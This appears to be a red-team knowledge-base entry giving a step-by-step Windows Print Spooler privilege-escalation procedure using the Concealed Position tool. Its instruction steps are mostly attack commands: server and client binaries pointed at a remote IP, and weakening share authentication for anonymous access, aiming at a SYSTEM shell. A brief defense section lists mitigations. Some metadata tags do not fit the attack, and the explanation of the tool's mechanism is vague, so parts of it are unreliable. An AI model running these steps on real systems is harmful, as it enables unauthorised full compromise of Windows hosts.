---
id: 401ed390-f508-4903-ace8-f53d02192fe7
name: Printer-Spooler-Service-Elevation-of-Privilege
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.918021+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Defense Evasion]]'
  - '[[Persistence]]'
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[Abuse Elevation Control Mechanism]]'
  - '[[Event Triggered Execution]]'
sub_techniques:
  - '[[Accessibility Features]]'
tags:
  - '[[tags/Bring Your Own Vulnerability]]'
  - '[[tags/EoP - Printers]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/cp-server-create-with-name]]'
  - '[[commands/get-printer-information]]'
  - '[[commands/turn-off-password-protected-sharing]]'
  - '[[commands/cp-client-create-with-remote-ip-and-name]]'
  - '[[commands/cp-client-list-with-name]]'
platforms:
  - Windows
tools: []
validated: true
---

# Printer-Spooler-Service-Elevation-of-Privilege

## Summary

This procedure exploits the Windows Print Spooler service using the Concealed Position tool to achieve privilege escalation to SYSTEM level. By setting up a malicious server and client configuration, an attacker with low-privileged access can abuse the spooler to execute code in an elevated context, enabling full system compromise for persistence, data exfiltration, or further lateral movement.

## Description

The Windows Print Spooler (spoolsv.exe) runs as SYSTEM and handles print jobs, making it a prime target for elevation of privilege attacks. This procedure leverages the Concealed Position tool, which installs a concealed server on the target and a client that triggers execution via spooler interactions. The attack requires local access to execute binaries and modify sharing settings. Once executed, the client connects to the server, exploiting the spooler's elevated privileges to run arbitrary code. This is particularly effective on unpatched Windows systems where spooler services are enabled. The technique aligns with bring-your-own-vulnerability (BYOV) patterns, as the tool introduces the exploit payload.

## Requirements

1. Local access to the target Windows system with ability to execute binaries (e.g., low-privileged user account).
2. Print Spooler service running and accessible (default on Windows).
3. Concealed Position tool binaries (cp_server.exe and cp_client.exe) available on the target or transferable via initial access.
4. Network connectivity if remote IP is involved (e.g., for client-server communication).
5. PowerShell or Command Prompt execution permitted.

## Defense

- Disable the Print Spooler service on systems where printing is not required: `sc config spooler start= disabled`.
- Apply security updates, including patches for known spooler vulnerabilities like PrintNightmare (CVE-2021-34527).
- Implement application whitelisting (e.g., AppLocker or WDAC) to block unsigned executables like cp_server.exe and cp_client.exe.
- Monitor for unusual spooler activity, such as unexpected RPC calls or file creations in %SystemRoot%\System32\spool\drivers.
- Enable advanced auditing for process creation and service modifications.

## Objectives

1. Establish a concealed server via the Print Spooler to gain SYSTEM-level execution.
2. Configure client to trigger elevated code execution and connect to the server.
3. Achieve persistent elevated access for further compromise.

## Instructions

### Step 1: Create Concealed Position Server

**Context**: Install the server component with a specified name to prepare the Print Spooler for exploitation. This creates the payload that will run under SYSTEM privileges.

**Command** ([[commands/cp-server-create-with-name]]):
```powershell
cp_server.exe -e ACIDDAMAGE
```

> This command deploys the server executable, naming it 'ACIDDAMAGE' for identification. It installs components that hook into the spooler service. Verify installation by checking for new files in the spooler directory.

### Step 2: Retrieve Printer Information

**Context**: Enumerate existing printers to identify targets for the exploit and ensure the spooler is operational.

**Command** ([[commands/get-printer-information]]):
```powershell
Get-Printer
```

> This PowerShell cmdlet lists all installed printers, their drivers, and ports. Look for output showing active spooler-managed printers, confirming the service is ready for abuse.

### Step 3: Disable Password Protected Sharing

**Context**: Modify network sharing settings to allow unauthenticated access to the printer share, enabling the client to connect without credentials.

**Command** ([[commands/turn-off-password-protected-sharing]]):
```powershell
# Manually set via GUI or PowerShell: netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
# Then in Network and Sharing Center: Turn off password protected sharing
```

> Access 'Advanced sharing settings' in Control Panel or use PowerShell to disable password protection. This opens the share for anonymous connections. Confirm by attempting a null session connect to the IPC$ share.

### Step 4: Create Concealed Position Client

**Context**: Deploy the client with connection details to link to the server IP and name, preparing it to trigger the elevated execution.

**Command** ([[commands/cp-client-create-with-remote-ip-and-name]]):
```powershell
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
```

> This generates the client, specifying the remote server IP (10.0.0.9), client name ('ACIDDAMAGE'), and execution name. It sets up the payload for spooler interaction. Expected confirmation of client creation in output.

### Step 5: Launch Client and List Printers

**Context**: Initiate the client to connect and list shared printers, triggering the privilege escalation via spooler.

**Command** ([[commands/cp-client-list-with-name]]):
```powershell
cp_client.exe -l -e ACIDDAMAGE
```

> This launches the client in list mode, executing under elevated privileges and displaying connected printers. Success is indicated by a SYSTEM shell or command prompt if escalation occurs.
